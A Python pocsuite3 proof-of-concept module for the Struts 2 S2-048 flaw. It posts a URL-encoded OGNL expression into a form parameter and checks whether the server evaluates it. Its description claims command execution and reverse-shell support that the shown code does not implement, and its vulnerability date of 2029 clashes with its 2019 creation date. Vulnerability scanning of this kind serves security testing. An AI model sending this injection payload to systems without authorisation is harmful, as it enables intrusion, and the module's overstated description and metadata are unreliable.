import random
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.interpreter_option import OptString


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['']
    vulDate = '2029-5-8'
    createDate = '2019-5-8'
    updateDate = '2019-5-8'
    references = ['']
    name = ''
    appPowerLink = ''
    appName = 'struts2'
    appVersion = ''
    vulType = ''
    desc = '''S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["post_data"] = OptString('username=test&password={exp}', description="在要检测的参数位置用{exp}代替")
        return o

    def _verify(self):
        result = {}
        data = self.get_option("post_data")
        headers = {
            "Content-Type": 'application/x-www-form-urlencoded'
        }
        check_poc = "%24%7B{num1}%2B{num2}%7D"
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = check_poc.format(num1=num1, num2=num2)
        data = data.format(exp=poc)
        html = requests.post(self.url, data, headers).text
        nn = str(num1 + num2)
        if nn in html:
            result["VerifyInfo"] = {
                "URL": self.url,
            }
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
